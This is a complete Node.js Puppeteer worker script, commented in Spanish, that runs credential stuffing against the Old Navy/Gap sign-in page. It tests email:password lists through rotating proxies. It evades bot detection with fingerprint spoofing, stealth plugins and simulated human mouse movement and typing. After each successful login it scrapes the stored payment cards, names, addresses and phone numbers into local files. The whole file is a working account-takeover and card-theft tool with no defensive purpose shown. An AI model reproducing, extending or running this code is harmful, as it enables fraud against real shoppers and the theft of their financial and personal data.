const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const userPreferencesPlugin = require('puppeteer-extra-plugin-user-preferences');
const { parentPort, workerData } = require('worker_threads');
const path = require('path');
const fs = require('fs-extra');
const os = require('os');
const { execSync } = require('child_process');
const chromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
const { v4: uuidv4 } = require('uuid'); // UUID para directorios únicos

puppeteer.use(StealthPlugin());

puppeteer.use(userPreferencesPlugin({
    userPrefs: {
        profile: {
            password_manager_enabled: false,
        },
        credentials_enable_service: false,
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));

let isPaused = false; // Variable para controlar la pausa
let browser;
let userDataDir;
let page;
// Función para manejar la pausa
function checkPaused() {
    return new Promise((resolve) => {
        const interval = setInterval(() => {
            if (!isPaused) {
                clearInterval(interval);
                resolve();
            }
        }, 100); // Verifica cada 100ms si el worker sigue en pausa
    });
}

// Manejar mensajes desde el proceso principal
parentPort.on('message', async (message) => {
    if (message === 'pause') {
        isPaused = true;
        parentPort.postMessage('Worker pausado');
    } else if (message === 'resume') {
        isPaused = false;
        parentPort.postMessage('Worker reanudado');
    } else if (message === 'stop') {
        
        killChromeProcesses();

        await cleanUp(browser, page, userDataDir);

        parentPort.postMessage('Worker detenido');
        process.exit(0); // Finalizar el proceso del worker
    }
});




function getRandomFingerprint() {
    const hardwareConcurrencyOptions = [2, 4, 8, 12, 16];
    const deviceMemoryOptions = [4, 8, 12, 16, 32];
    const platformOptions = ['Win32', 'MacIntel', 'Linux x86_64', 'Linux armv7l'];
    const languageOptions = [
        ['en-US', 'en'],
        ['fr-FR', 'fr'],
        ['es-ES', 'es'],
        ['de-DE', 'de'],
        ['zh-CN', 'zh'],
        ['ja-JP', 'ja'],
        ['ko-KR', 'ko']
    ];
    const vendorOptions = {
        'Win32': 'Google Inc.',
        'MacIntel': 'Apple Inc.',
        'Linux x86_64': 'Mozilla Foundation',
        'Linux armv7l': 'Google Inc.'
    };
    const webGLVendorOptions = {
        'Win32': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
        'MacIntel': ['Apple Inc.', 'AMD'],
        'Linux x86_64': ['Intel Inc.', 'NVIDIA Corporation', 'AMD'],
        'Linux armv7l': ['Qualcomm', 'ARM']
    };
    const webGLRendererOptions = {
        'Win32': ['Intel(R) Iris(TM) Plus Graphics 640', 'GeForce GTX 1050', 'Radeon RX 580'],
        'MacIntel': ['Apple M1', 'Radeon RX 580'],
        'Linux x86_64': ['GeForce GTX 1050', 'Radeon RX 580'],
        'Linux armv7l': ['Mali-G76', 'Adreno (TM) 540']
    };
    const screenResolutionOptions = [
        { width: 1920, height: 1080 },
        { width: 1366, height: 768 },
        { width: 1440, height: 900 },
        { width: 1536, height: 864 },
        { width: 1280, height: 800 },
        { width: 2560, height: 1440 }
    ];

    const platform = platformOptions[Math.floor(Math.random() * platformOptions.length)];
    const randomScreen = screenResolutionOptions[Math.floor(Math.random() * screenResolutionOptions.length)];

    return {
        hardwareConcurrency: hardwareConcurrencyOptions[Math.floor(Math.random() * hardwareConcurrencyOptions.length)],
        deviceMemory: deviceMemoryOptions[Math.floor(Math.random() * deviceMemoryOptions.length)],
        platform: platform,
        languages: languageOptions[Math.floor(Math.random() * languageOptions.length)],
        vendor: vendorOptions[platform],
        webGLVendor: webGLVendorOptions[platform][Math.floor(Math.random() * webGLVendorOptions[platform].length)],
        webGLRenderer: webGLRendererOptions[platform][Math.floor(Math.random() * webGLRendererOptions[platform].length)],
        screen: randomScreen
    };
}

// Obtiene el fingerprint almacenado en caché o genera uno nuevo si no existe
function getCachedFingerprint() {
    if (!cachedFingerprint) {
        cachedFingerprint = getRandomFingerprint();
    }
    return cachedFingerprint;
}

// Resetea la cache del fingerprint para que se genere uno nuevo en la próxima llamada
function resetFingerprintCache() {
    cachedFingerprint = null;
}

// Aplica el fingerprint configurado al navegador
function configureFingerprint(page) {
    const fingerprint = getCachedFingerprint();

    return page.evaluateOnNewDocument((fingerprint) => {
        Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => fingerprint.hardwareConcurrency });
        Object.defineProperty(navigator, 'deviceMemory', { get: () => fingerprint.deviceMemory });
        Object.defineProperty(navigator, 'platform', { get: () => fingerprint.platform });
        Object.defineProperty(navigator, 'languages', { get: () => fingerprint.languages });
        Object.defineProperty(navigator, 'vendor', { get: () => fingerprint.vendor });
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'doNotTrack', { get: () => '1' });

        const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) return fingerprint.webGLVendor;
            if (parameter === 37446) return fingerprint.webGLRenderer;
            return getParameter(parameter);
        };

        const getContext = HTMLCanvasElement.prototype.getContext;
        HTMLCanvasElement.prototype.getContext = function(type, ...args) {
            const context = getContext.apply(this, [type, ...args]);
            if (type === '2d' || type === 'webgl') {
                const getImageData = context.getImageData;
                context.getImageData = function(x, y, width, height) {
                    const imageData = getImageData.apply(this, [x, y, width, height]);
                    for (let i = 0; i < imageData.data.length; i += 4) {
                        imageData.data[i] ^= 0x01;
                        imageData.data[i + 1] ^= 0x01;
                        imageData.data[i + 2] ^= 0x01;
                    }
                    return imageData;
                };
            }
            return context;
        };

        // Simular las propiedades de la pantalla
        Object.defineProperty(screen, 'width', { get: () => fingerprint.screen.width });
        Object.defineProperty(screen, 'height', { get: () => fingerprint.screen.height });
        Object.defineProperty(screen, 'availWidth', { get: () => fingerprint.screen.width });
        Object.defineProperty(screen, 'availHeight', { get: () => fingerprint.screen.height - 40 });

        // Parchado de funciones del navegador
        const patchFunction = (obj, funcName, newFunc) => {
            const originalFunc = obj[funcName];
            obj[funcName] = function(...args) {
                return newFunc.apply(this, [originalFunc.bind(this), ...args]);
            };
        };

        patchFunction(navigator, 'getBattery', (originalFunc) => {
            return Promise.resolve({
                charging: true,
                chargingTime: 0,
                dischargingTime: Infinity,
                level: 1.0
            });
        });
    }, fingerprint);
}




function getUserAgent() {
    try {
        const userAgent = execSync('python3 get_user_agent.py').toString().trim();
        return userAgent;
    } catch (error) {
        console.error('Error al obtener el User-Agent:', error.message);
        throw error;
    }
}

async function createBrowserInstance(proxy) {
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-web-security',
        '--disable-blink-features=AutomationControlled',
        '--disable-extensions',
        '--disable-dev-shm-usage',
        '--disable-infobars',
        '--window-size=1280,800',
        '--disable-accelerated-2d-canvas',
        '--disable-features=IsolateOrigins,site-per-process',
        '--disable-notifications',
        '--disable-popup-blocking',
        '--disable-features=PasswordProtectionWarningTrigger',
        '--disable-features=SafeBrowsingEnhancedProtection',
        '--disable-prompt-on-repost',
        '--disable-features=PasswordCheck',
        '--disable-cache'
    ];

    let proxyAuth;
    let proxyUrl;

    if (proxy) {
        const proxyParts = proxy.split(':');

        // Loguea las partes del proxy
        parentPort.postMessage(`Partes del proxy: ${JSON.stringify(proxyParts)}`);

        if (proxyParts.length === 2) {
            // Formato: host:port
            proxyUrl = `http://${proxy}`;
            parentPort.postMessage(`Formato básico: ${proxyUrl}`);
        } else if (proxyParts.length === 4) {
            // Formato: host:port:username:password
            proxyUrl = `http://${proxyParts[0]}:${proxyParts[1]}`;
            proxyAuth = {
                username: proxyParts[2], // No uses encodeURIComponent aquí
                password: proxyParts[3]
            };
            parentPort.postMessage(`Formato con autenticación: ${proxyUrl}`);
        } else {
            parentPort.postMessage("Formato de proxy inválido. Se espera: host:port o host:port:username:password");
            return;
        }

        args.push(`--proxy-server=${proxyUrl}`);
        parentPort.postMessage(`Usando proxy: ${proxyUrl}`);
    } else {
        //parentPort.postMessage('No se está utilizando proxy.');
    }

    try {
        userDataDir = path.join(os.tmpdir(), `puppeteer_tmp_${uuidv4()}`);
        await resetFingerprintCache();
        const userAgent = getUserAgent();
        const browser = await puppeteer.launch({
            headless: workerData.useHeadless,
            userDataDir,
            args: args,
            executablePath: chromePath, 
        });

        const page = await browser.newPage();
       await page.setUserAgent(userAgent);

        if (proxyAuth) {
            await page.authenticate(proxyAuth);
            parentPort.postMessage(`Autenticación utilizada: ${proxyAuth.username}:${proxyAuth.password}`);
        }
        
        await configureFingerprint(page);

        return { browser, page };

    } catch (error) {
        console.error("Error al crear la instancia del navegador:", error.message);
        throw error; 
    }
}

function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}
function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}



function saveValidData(email, password, cardData) {
    const data = `Email: ${email}\nPassword: ${password}\n` +
        `Número: ${cardData.cardNumber}\nExpiración: ${cardData.expirationDate}\n` +
        `Nombre: ${cardData.fullName}\nDirección: ${cardData.address}\nCiudad: ${cardData.city}\n` +
        `Estado: ${cardData.state}\nCódigo Postal: ${cardData.zipCode}\nTeléfono: ${cardData.phoneNumber}\n` +
        `-----------------------------------------\n`;
    fs.appendFileSync('valid.txt', data);
}

async function handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser }) {
    // Función auxiliar para cambiar el proxy y reintentar
    const changeProxyAndRetry = async (message) => {
        parentPort.postMessage(message);
        if (useProxies && proxies.length > 0) {
            proxyIndex = (proxyIndex + 1) % proxies.length;
        }
        if (retryOnFail) {
            i--; // Reintentar con el mismo correo
        }
    };

    // Manejo de diferentes tipos de errores
    if (error.message.includes('IP bloqueada')) {
        await changeProxyAndRetry('IP bloqueada. Cambiando proxy y reintentando...');
    } else if (error.message.includes('net::ERR_NO_SUPPORTED_PROXIES')) {
        await changeProxyAndRetry('Proxy no soportado. Cambiando a otro proxy y reintentando...');
    } else if (error.name === 'TimeoutError') {
        await changeProxyAndRetry('TimeoutError detectado. Asumiendo IP bloqueada y reintentando...');
    } else {
        parentPort.postMessage(`Error inesperado: ${error.message}`);
    }

    return i;
}



function extractCardData(formHTML) {
    const extractInputValue = (html, id) => {
        const regex = new RegExp(`<input[^>]*id="${id}"[^>]*value="([^"]+)"`, 'i');
        const match = regex.exec(html);
        return match ? match[1] : 'No disponible';
    };

    const extractInputByName = (html, name) => {
        const regex = new RegExp(`<input[^>]*name="${name}"[^>]*value="([^"]+)"`, 'i');
        const match = regex.exec(html);
        return match ? match[1] : 'No disponible';
    };

    const cardNumber = extractInputValue(formHTML, 'cardNumber');
    const expirationDate = extractInputValue(formHTML, 'expirationDate');
    const fullName = extractInputByName(formHTML, 'fullName');
    const address = extractInputByName(formHTML, 'addressLine1');
    const city = extractInputByName(formHTML, 'city');
    const zipCode = extractInputByName(formHTML, 'zipCode');
    const phoneNumber = extractInputByName(formHTML, 'dayPhone');

    const stateMatch = formHTML.match(/<button[^>]*>(.*?)<\/button>/);
    const state = stateMatch ? stateMatch[1] : 'No disponible';

    return { cardNumber, expirationDate, fullName, address, city, state, zipCode, phoneNumber };
}

async function closeCardForm(page, humanizedMode) {
    try {
        parentPort.postMessage('Intentando cerrar el formulario...');
        await page.evaluate(() => {
            document.querySelector('button[aria-label="close modal"]').click();
        });
        await checkPaused();
        await new Promise(resolve => setTimeout(resolve, humanizedMode ? 2000 : 2000));
        parentPort.postMessage('Formulario cerrado exitosamente.');
    } catch (error) {
        parentPort.postMessage('Error al intentar cerrar el formulario: ' + error.message);
    }
}

async function simulateHumanClick(page, selector) {
    const button = await page.$(selector);
    const buttonBox = await button.boundingBox();
    await page.mouse.move(
        buttonBox.x + buttonBox.width / 2,
        buttonBox.y + buttonBox.height / 2,
        { steps: randomDelay(10, 20) }
    );

    await new Promise(resolve => setTimeout(resolve, randomDelay(100, 300)));
    await page.click(selector);
}




async function checkAccessDenied(page) {
    return await page.evaluate(() => {
        const h1Element = document.querySelector('h1');
        return h1Element && h1Element.textContent.includes('Access Denied');
    });
}

async function loginWithEmail(page, email, humanizedMode) {
    try {
        // Detectar el campo de correo electrónico
        const emailSelectors = ['#verify-email-input', '#verify-account-email'];
        let emailSelector;

        for (const selector of emailSelectors) {
            if (await page.$(selector)) {
                emailSelector = selector;
                parentPort.postMessage(`Usando el campo de correo electrónico (${selector})`);
                break;
            }
        }

        if (!emailSelector) {
            parentPort.postMessage('No se encontró ningún campo de correo electrónico.');
            throw new Error('No se detectó el campo de correo electrónico.');
        }

        if (humanizedMode) {
            // Mover el ratón lentamente hacia el campo de correo electrónico
            const emailBox = await page.$(emailSelector);
            const boundingBox = await emailBox.boundingBox();
            if (boundingBox) {
                // Movimiento gradual hacia el campo, simulando los pasos del ratón
                await page.mouse.move(boundingBox.x, boundingBox.y); // Inicio del movimiento
                await delay(randomDelay(100, 300)); // Pequeña pausa entre movimientos
                await page.mouse.move(boundingBox.x + boundingBox.width / 2, boundingBox.y + boundingBox.height / 2, { steps: 15 });
                await delay(randomDelay(300, 600)); // Pausa antes de hacer clic
            }

            // Simular clic humano en el campo
            await emailBox.click({ delay: randomDelay(50, 200) });

            // Escribir el correo de forma humanizada
            await humanizedTyping(page, emailSelector, email, humanizedMode);
        } else {
            // Modo no humanizado: escribir directamente
            await page.type(emailSelector, email, { delay: randomDelay(50, 150) });
        }

      

        await checkPaused();

        // Interactuar con el botón "Continue"
        await clickContinueButton(page, humanizedMode);
    } catch (error) {
        console.error('Error en loginWithEmail:', error);
        throw error; // Re-lanzar el error para manejarlo en un nivel superior si es necesario
    }
}


async function randomUserMovement(page, duration = 5000) {
    try {
        const startTime = Date.now();
        while (Date.now() - startTime < duration) {
            // Seleccionar una acción aleatoria
            const action = randomInt(1, 3); // Tenemos tres posibles acciones: mover ratón, hacer scroll, y pausar

            if (action === 1) {
                // Mover el ratón aleatoriamente en la página
                await moveMouseRandomly(page);
            } else if (action === 2) {
                // Desplazar la página aleatoriamente
                await scrollRandomly(page);
            } else {
                // Pausar por un momento
                await delay(randomDelay(500, 1500)); // Pausa de entre 0.5 y 1.5 segundos
            }

            // Pausar un poco antes de la próxima acción
            await delay(randomDelay(500, 1500));
        }
    } catch (error) {
        console.error('Error en randomUserMovement:', error);
        throw error;
    }
}

// Función para mover el ratón a posiciones aleatorias en la página
async function moveMouseRandomly(page) {
    // Obtener las dimensiones del viewport directamente desde el navegador
    const viewport = await page.evaluate(() => {
        return {
            width: window.innerWidth,
            height: window.innerHeight
        };
    });

    // Generar coordenadas aleatorias dentro del viewport
    const x = randomInt(0, viewport.width);
    const y = randomInt(0, viewport.height);

    await page.mouse.move(x, y, { steps: randomInt(10, 25) });
    await delay(randomDelay(100, 500)); // Pausa breve tras el movimiento del ratón
}

// Función para hacer scroll aleatorio en la página
async function scrollRandomly(page) {
    const scrollAmount = randomInt(-300, 300); // Scroll hacia arriba o abajo
    await page.evaluate((scrollAmount) => {
        window.scrollBy(0, scrollAmount);
    }, scrollAmount);
    await delay(randomDelay(200, 1000)); // Pausa breve tras el scroll
}




async function humanizedTyping(page, selector, text) {
    try {
        for (let i = 0; i < text.length; i++) {
            await page.type(selector, text[i], { delay: randomDelay(100, 300) });

            // Simular errores de escritura ocasionales
            if (Math.random() < 0.05) {
                await page.keyboard.press('Backspace');
                await new Promise(resolve => setTimeout(resolve,randomDelay(200,500 )));
               
                i--; // Retroceder para reescribir el carácter
            }

            // Pausas ocasionales más largas
            if (Math.random() < 0.1) {
                await new Promise(resolve => setTimeout(resolve,randomDelay(500,1500 )));
            
            }
        }
    } catch (error) {
        console.error('Error en simulateHumanTyping:', error);
        throw error;
    }
}

async function clickContinueButton(page, humanizedMode) {
    try {
        const continueButtonSelector = 'button[type="submit"], button:contains("Continue")';
        await page.waitForSelector(continueButtonSelector, { visible: true, timeout: 10000 });

        if (humanizedMode) {
            // Mover el ratón lentamente hacia el botón "Continue"
            const continueButton = await page.$(continueButtonSelector);
            const boundingBox = await continueButton.boundingBox();
            if (boundingBox) {
                // Movimiento gradual hacia el botón, simulando pasos del ratón
                await page.mouse.move(boundingBox.x, boundingBox.y); // Inicio del movimiento
                await delay(randomDelay(100, 300)); // Pausa en el inicio del movimiento
                await page.mouse.move(boundingBox.x + boundingBox.width / 2, boundingBox.y + boundingBox.height / 2, { steps: 15 });
                await delay(randomDelay(300, 600)); // Pausa antes de hacer clic

                // Simular clic humano en el botón "Continue"
                await continueButton.click({ delay: randomDelay(50, 200) });
            } else {
                throw new Error('No se encontró el botón de continuar.');
            }
        } else {
            // Modo no humanizado: clic directo
            await page.click(continueButtonSelector);
        }

    } catch (error) {
        console.error('Error en clickContinueButton:', error);
        throw error; // Re-lanzar el error para manejarlo en un nivel superior si es necesario
    }
}




async function clickContinueButton(page, humanizedMode) {
    // Selectores de los botones
    const newButtonSelector = 'button[data-testid="verify-email-btn"]';
    const oldButtonSelector = '.loyalty-email-button'; // Reemplaza este selector con el correcto si cambia

    // Verificar si alguno de los botones está presente en la página
    const newButton = await page.$(newButtonSelector);
    const oldButton = await page.$(oldButtonSelector);

    let buttonSelector;

    if (newButton) {
        buttonSelector = newButtonSelector;
       
    } else if (oldButton) {
        buttonSelector = oldButtonSelector;
        
    } else {
       
        throw new Error('Botón "Continue" no encontrado.');
    }

    // Simular clic en el botón según el modo humanizado
    if (humanizedMode) {
        await simulateHumanClick(page, buttonSelector);
    } else {
        await page.click(buttonSelector);
    }

    await checkPaused();
    parentPort.postMessage('Clic en el botón "Continue" realizado.');
}




async function determineNavigationResult(page, humanizedMode) {
    const timeoutValue = humanizedMode ? 20000 : 15000;  // Ajustar el tiempo de espera

    try {
        return await Promise.race([
            // Verificar si aparece el formulario de creación de cuenta
            page.waitForSelector('div[data-testid="create-account"]', { timeout: timeoutValue }).then(() => 'register'),
            
            // Verificar si aparece la opción de crear cuenta
            page.waitForSelector('div#create-account-opt', { timeout: timeoutValue }).then(() => 'register'),
            
            // Verificar si aparece el campo de contraseña (correo registrado)
            page.waitForSelector('input[name="password"]', { timeout: timeoutValue }).then(() => 'login'),

            // Verificar si la URL cambia para incluir 'errorCode=email_validation' (baneo)
            new Promise((resolve, reject) => {
                const checkUrlInterval = setInterval(() => {
                    const currentUrl = page.url();
                    if (currentUrl.includes('errorCode=email_validation')) {
                        clearInterval(checkUrlInterval);  // Detener el intervalo
                        resolve('banned');  // Resolver como 'banned'
                    }
                }, 500);  // Revisar la URL cada 500 ms

                setTimeout(() => {
                    clearInterval(checkUrlInterval);  // Detener el intervalo después de timeoutValue ms
                    reject(new Error('timeout'));  // Rechazar la promesa si se alcanza el tiempo de espera
                }, timeoutValue);
            })
        ]);
    } catch (error) {
        parentPort.postMessage('No se pudo determinar el estado del correo debido a un error de carga o tiempo de espera.');
        throw new Error('Error al determinar el estado del correo.');
    }
}


async function handleLoginResult(navigationResult, page, email, password, humanizedMode, browser, results) {
    if (navigationResult === 'banned') {
        parentPort.postMessage('IP bloqueada');
        return;
    }

    
    
    if (navigationResult === 'register') {
        parentPort.postMessage('El correo no está registrado.');
        return;
    }

    if (navigationResult === 'login') {
        parentPort.postMessage('El correo ya está registrado.');
        await loginWithPassword(page, password, humanizedMode);

        const passwordError = await checkPasswordError(page, humanizedMode);
        if (passwordError) {
            parentPort.postMessage('Contraseña incorrecta. Cerrando navegador.');
            return;
        }

        await accessSavedCardsSection(page, email, password, humanizedMode, results);
    } else { 
        parentPort.postMessage('No se pudo determinar el estado del correo.');
    }
}

async function loginWithPassword(page, password, humanizedMode) {
    // Selectores del campo de contraseña
    const newPasswordSelector = 'input[data-testid="sign-in-password-input"]'; // Selector del nuevo campo
    const oldPasswordSelector = 'input[name="password"]';  // Selector del campo antiguo

    // Verificar si alguno de los campos de contraseña está presente en la página
    const newPasswordField = await page.$(newPasswordSelector);
    const oldPasswordField = await page.$(oldPasswordSelector);

    let passwordSelector;

    if (newPasswordField) {
        passwordSelector = newPasswordSelector;
       
    } else if (oldPasswordField) {
        passwordSelector = oldPasswordSelector;
        
    } else {
        parentPort.postMessage('No se encontró ningún campo de contraseña.');
        throw new Error('Campo de contraseña no encontrado.');
    }

    // Interactuar con el campo de contraseña detectado
    await page.waitForSelector(passwordSelector);
    await page.type(passwordSelector, password, { delay: humanizedMode ? randomDelay(100, 200) : randomDelay(50, 100) });
    await checkPaused();

    // Detectar el nuevo botón de inicio de sesión
    const newSignInButtonSelector = 'button[data-testid="enter-password-btn"]';  // Supongamos que este es el nuevo selector
    const oldSignInButtonSelector = '.loyalty-signInForm-button, .loyalty-signInForm-button-with-legaltext'; // Selector del botón antiguo

    // Verificar si alguno de los botones de inicio de sesión está presente en la página
    const newSignInButton = await page.$(newSignInButtonSelector);
    const oldSignInButton = await page.$(oldSignInButtonSelector);

    if (newSignInButton) {
        await newSignInButton.click();
        
    } else if (oldSignInButton) {
        await oldSignInButton.click();
       
    } else {
        parentPort.postMessage('No se encontró el botón de inicio de sesión.');

        return;
    }

    await checkPaused();
}



async function checkPasswordError(page, humanizedMode) {
    const timeoutValue = humanizedMode ? 10000 : 5000;  // Ajuste del tiempo de espera

    return await Promise.race([
        // Verificar el antiguo mensaje de error
        page.waitForFunction(
            () => document.querySelector('.loyalty-signInForm-container')?.innerText.includes('Password not associated with this email address'),
            { timeout: timeoutValue }
        ),

        // Verificar el nuevo mensaje de error
        page.waitForFunction(
            () => document.querySelector('div[role="alert"]')?.innerText.includes('Password not associated with this email address'),
            { timeout: timeoutValue }
        )
    ]).then(() => true).catch(() => false);
}


async function accessSavedCardsSection(page, email, password, humanizedMode, results) {
    await page.waitForSelector('.redesign-sidebar-nav-section-header-title', { timeout: humanizedMode ? 15000 : 10000 });
    parentPort.postMessage('Inicio de sesión exitoso.');

    fs.appendFileSync('valid.txt', `\n---------------------------\n${email}:${password}\n---------------------------\n`);

    await page.goto('https://secure-oldnavy.gap.com/my-account/saved-cards', { waitUntil: 'domcontentloaded' });
    parentPort.postMessage('Navegando a la sección de tarjetas guardadas...');
    await page.waitForSelector('.wallet-credit-card-edit', { timeout: humanizedMode ? 15000 : 10000 });
    parentPort.postMessage('Tarjetas encontradas.');

    const cards = await page.$$('.wallet-credit-card-edit');
    parentPort.postMessage(`Número de tarjetas encontradas: ${cards.length}`);

    for (const [index, card] of cards.entries()) {
        await processCard(page, card, index, email, password, humanizedMode, results);
    }
}

async function processCard(page, card, index, email, password, humanizedMode, results) {
    parentPort.postMessage(`Procesando tarjeta ${index + 1}...`);
    await page.evaluate(el => el.click(), card);
    await page.waitForSelector('.add-payment-form', { timeout: humanizedMode ? 15000 : 10000 });
    parentPort.postMessage(`Formulario de edición de la tarjeta ${index + 1} abierto.`);
    await checkPaused();

    const formHTML = await page.evaluate(() => document.querySelector('.add-payment-form').innerHTML);
    parentPort.postMessage(`HTML del formulario de la tarjeta ${index + 1}:`);

    try {
        const cardData = extractCardData(formHTML);
        parentPort.postMessage(`Datos de la tarjeta ${index + 1}: ${JSON.stringify(cardData)}`);
        saveValidData(email, password, cardData);
        results.push({ email, password, ...cardData });
    } catch (error) {
        parentPort.postMessage(`Error al extraer los datos de la tarjeta ${index + 1}: ${error.message}`);
    }

    await closeCardForm(page, humanizedMode);
}

function saveResults(results) {
    fs.writeFileSync(`resultados-worker-${process.pid}.json`, JSON.stringify(results, null, 2));
}


async function runWorker(credentials, proxies, useProxies, retryOnFail, humanizedMode) {
    console.log('Valores recibidos en el worker:', { useProxies, retryOnFail, humanizedMode });
    let proxyIndex = 0;
    const results = [];

    for (let i = 0; i < credentials.length; i++) {
        await checkPaused();
        const { email, password } = credentials[i];
        parentPort.postMessage(`Verificando: ${email}`);

        let proxy = useProxies && proxies.length > 0 ? proxies[proxyIndex] : null;
        let { browser, page } = await createBrowserInstance(proxy);

        try {
            await page.goto('https://secure-oldnavy.gap.com/my-account/sign-in', {  waitUntil: 'networkidle2' });
            
            await checkPaused();

            const accessDenied = await checkAccessDenied(page);
            if (accessDenied) {
                parentPort.postMessage('Elemento "Access Denied" detectado: IP bloqueada.');
                throw new Error('IP bloqueada');
            }
            await randomUserMovement(page, 5000);
            await loginWithEmail(page, email, humanizedMode);

            const navigationResult = await determineNavigationResult(page, humanizedMode);
            await handleLoginResult(navigationResult, page, email, password, humanizedMode, browser, results);
         } catch (error) {
            i = await handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser });
        } finally {
            await cleanUp(browser, page, userDataDir);
        }

    }

    saveResults(results);
    await checkPaused();
    parentPort.postMessage('Worker ha finalizado todas las tareas.');
}

async function cleanUp(browser, page, userDataDir) {
    try {
        
        if (page && !page.isClosed()) {
            await withTimeout(page.close(), 5000); // Agrega manejo de tiempo de espera
            parentPort.postMessage('Página cerrada');
        }
        if (browser && browser.isConnected()) {
            await withTimeout(browser.close(), 5000, 'Cerrando navegador');
            parentPort.postMessage('Navegador cerrado');
        }
        const browserProcess = browser ? browser.process() : null;
        if (browserProcess && !browserProcess.killed) {
            browserProcess.kill('SIGKILL');
            parentPort.postMessage('Proceso del navegador forzado a cerrar.');
        }

        await new Promise(resolve => setTimeout(resolve, 2000));

        await removeDirectory(userDataDir);
    } catch (error) {
        parentPort.postMessage(`Error al cerrar la página o el navegador: ${error.message}`);
    }
}


async function removeDirectory(userDataDir) {
    if (fs.existsSync(userDataDir)) {
        for (let attempt = 0; attempt < 3; attempt++) {
            try {
                fs.rmSync(userDataDir, { recursive: true, force: true });
                console.log(`Directorio ${userDataDir} eliminado en el intento ${attempt + 1}.`);
                break;
            } catch (error) {
                console.log(`Error al eliminar el directorio ${userDataDir} en el intento ${attempt + 1}: ${error.message}`);
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    }
}

function killChromeProcesses() {
    try {
        // Ejecuta el comando para matar todos los procesos de Chrome
        execSync('taskkill /IM chrome.exe /F /T');
        console.log('Todos los procesos de Chrome han sido forzados a cerrar.');
    } catch (error) {
        console.error(`Error al forzar el cierre de Chrome: ${error.message}`);
    }
}


async function withTimeout(promise, ms) {
    const timeout = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Operación de cierre de navegador excedió el tiempo límite')), ms)
    );
    return Promise.race([promise, timeout]);
}

runWorker(workerData.credentials, workerData.proxies, workerData.useProxies, workerData.retryOnFail, workerData.humanizedMode).catch(console.error);
